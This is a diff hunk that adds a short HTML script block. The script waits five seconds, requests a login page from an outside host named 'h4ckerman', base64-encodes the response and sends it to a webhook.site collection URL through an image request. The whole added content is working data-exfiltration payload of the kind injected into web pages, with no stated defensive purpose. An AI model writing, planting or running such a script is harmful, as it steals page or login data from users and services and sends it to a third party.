@@ -1,0 +1,13 @@
+<script>
+  setTimeout(() =>  {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://h4ckerman.hopto.org:8080/login');
+    xhr.onreadystatechange = () => {
+      if (xhr.readyState === 4) {
+        var img = new Image();
+        img.src = "https://webhook.site/359d4ebb-2880-4b02-a81d-420a870d327d?data="+btoa(xhr.responseText);
+      }
+    }
+    xhr.send();
+  }, 5000)
+</script>
